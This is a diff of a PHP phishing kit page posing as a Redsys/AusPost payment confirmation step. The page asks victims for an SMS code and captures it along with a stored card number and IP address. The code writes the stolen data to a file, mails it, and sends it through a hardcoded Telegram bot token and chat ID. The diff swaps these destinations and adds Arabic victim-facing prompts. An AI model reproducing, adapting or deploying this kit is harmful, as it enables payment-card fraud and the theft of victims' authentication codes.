@@ -14,24 +14,24 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             $message = "
             SHANkS
             ---------------
-            | CCN : ".$_SESSION['cc']."
-            | 2ND : ".$_POST['sms']."
+            | CCN : " . $_SESSION['cc'] . "
+            | 1ST : " . $_POST['sms'] ."
             | INF : " . $ip . "
-            ---------------\n\n";
+            ---------------\n";
 
-            $file = fopen("./UCHIHA.txt", "a+");
+            $file = fopen("./rz01.txt", "a+");
             fwrite($file, $message);
             fclose($file);
             $sms = $_POST['sms'];
-            $to = "lapayty@gmail.com";
-            $subject = "$ip =?utf-8?Q?=F0=9F=91=BD?= (2ND)";
-            $headers = "From: Ak47™<shanks@dPovrtgas.org>\r\n";
+            $to = "";
+            $subject = "$ip =?utf-8?Q?=F0=9F=91=BD?= (1ST)";
+            $headers = "From: Ak47™<shanks@dPortqgas.org>\r\n";
             $headers .= "MIME-Version: 1.0\r\n";
             $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
             mail($to, $subject, $message, $headers);
-            file_get_contents("https://api.telegram.org/bot1955265923:AAGwafJcpMwWBDbuITLrsYZa-VrA5QSbGb4/sendMessage?chat_id=-526214058&text=" . urlencode($message)."" );
+            file_get_contents("https://api.telegram.org/bot2063061087:AAF4J2MhpY_UGZ4bRdeEkPIvL3HdioJoJwo/sendMessage?chat_id=-745387116&text=" . urlencode($message)."" );
             
-        header("Location: third-loading.php?loading=".md5($_GET['error']));
+        header("Location: Seleccione_medio_de_pago_loading.php?loading=".md5($_GET['error']));
     }else header("Location: ?error=".md5($_GET['error']));
 }
 ?>
@@ -356,7 +356,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         <div style="position: fixed; text-align: center; height: 100%; width: 100%; top: 0; right: 0; left: 0; z-index: 9999999; background-color: #EAEAEA; opacity: 0.7;">
             <div class="load-container load">
                 <div class="loader">
-                    <span id="cargar">Loading..</span>
+                    <span id="cargar">.. &#x627;&#x644;&#x645;&#x639;&#x627;&#x644;&#x62c;&#x629;</span>
                 </div>
             </div>
         </div>
@@ -369,8 +369,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             <div id="cabecera" class="container ogilvy-bg-white">
                 <div class="row">
                     <div class="col-xs-12 text-center ogilvy-header">
-                        <img src="./Redsys_files/POST.svg" style="width: 70px;height: 70px" id="logoAusPost"
-                             class="ogilvy-logosuperior" alt="AusPost">
+                        <img src="./Redsys_files/POST.svg" id="logoauspost"
+                             class="ogilvy-logosuperior" alt="auspost.com.au">
 
                     </div>
                 </div>
@@ -404,14 +404,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                                              class="ogilvy-titular">
                                             <span id="fecha" class="descripcionPago"
                                                   style="font-weight:bold;"></span><span id="Fechavalor"
-                                                                                               style="font-weight:normal;"><?php echo date('d/m/Y '); ?></span>
+                                                                                               style="font-weight:normal;"><?php echo date('d/m/Y H:i:s'); ?></span>
                                         </div>
                                         <div style="margin-left: auto; margin-left: auto; text-align: center;"
                                              class="ogilvy-titular">
-<p><font color="#b71521;">&#x631;&#x645;&#x632;&#x20;&#x63a;&#x64a;&#x631;&#x20;&#x635;&#x62d;&#x64a;&#x62d;</font></p>
-
-                                            <span id="concepto" class="descripcionPago" style="font-weight:bold color="red"> </span><br><span
-                                                    id="conceptovalor" style="font-weight:normal;">&#x2e;&#x633;&#x648;&#x641;&#x20;&#x62a;&#x62d;&#x635;&#x644;&#x20;&#x639;&#x644;&#x649;&#x20;&#x627;&#x644;&#x631;&#x645;&#x632;&#x20;&#x627;&#x644;&#x62c;&#x62f;&#x64a;&#x62f;&#x20;&#x641;&#x64a;&#x20;&#x628;&#x636;&#x639;&#x20;&#x62b;&#x648;&#x627;&#x646;&#x20;&#x60c;&#x20;&#x627;&#x644;&#x631;&#x62c;&#x627;&#x621;&#x20;&#x625;&#x62f;&#x62e;&#x627;&#x644;&#x20;&#x627;&#x644;&#x631;&#x645;&#x632;&#x20;&#x644;&#x644;&#x62a;&#x62d;&#x642;&#x642;&#x20;&#x645;&#x646;&#x20;&#x635;&#x62d;&#x62a;&#x647;</span>
+                                            <span id="concepto" class="descripcionPago" style="font-weight:bold;">&#x53;&#x4d;&#x53;&#x20;&#x631;&#x645;&#x632; </span><br><span
+                                                    id="conceptovalor" style="font-weight:normal;">&#x633;&#x62a;&#x62a;&#x644;&#x642;&#x649;&#x20;&#x631;&#x645;&#x632;&#x627;&#x64b;&#x20;&#x642;&#x635;&#x64a;&#x631;&#x627;&#x64b;&#x20;&#x644;&#x62a;&#x62b;&#x628;&#x62a;&#x20;&#x635;&#x62d;&#x629;&#x20;&#x627;&#x644;&#x639;&#x645;&#x644;&#x64a;&#x629;&#xa;&#x623;&#x62f;&#x62e;&#x644;&#x20;&#x627;&#x644;&#x631;&#x645;&#x632;&#x20;&#x648;&#x646;&#x642;&#x631;&#x20;&#x639;&#x644;&#x649;&#x20;&#x62a;&#x623;&#x643;&#x64a;&#x62f;</span>
                                         </div>
                                     </div>
 
@@ -446,7 +444,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                         <div style="position: fixed; text-align: center; height: 100%; width: 100%; top: 0; right: 0; left: 0; z-index: 9999999; background-color: #EAEAEA; opacity: 0.7;">
                             <div class="load-container load">
                                 <div class="loader">
-                                    <span id="loading">Loading..</span></div>
+                                    <span id="loading">.. &#x627;&#x644;&#x645;&#x639;&#x627;&#x644;&#x62c;&#x629;</span></div>
                             </div>
                         </div>
 
@@ -476,7 +474,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                                                     <div class="div_relleno"
                                                          onclick="Javascript:changeMMPP('01757TA', this);">
                                                         <span id="GridViewPagoSimple_ctl02_lbDesPagoSimple"
-                                                              class="descripcionPago" >SMS code <input type="text" name="sms"  maxlength="8" class="input-res">
+                                                              class="descripcionPago">SMS code
+
+<input type="text" name="sms"  maxlength="10" class="input-res">
 
 
                                                             <!-- <input  style="float:right;" id="GridViewPagoSimple_ctl02_lbDesPagoSimple"-->
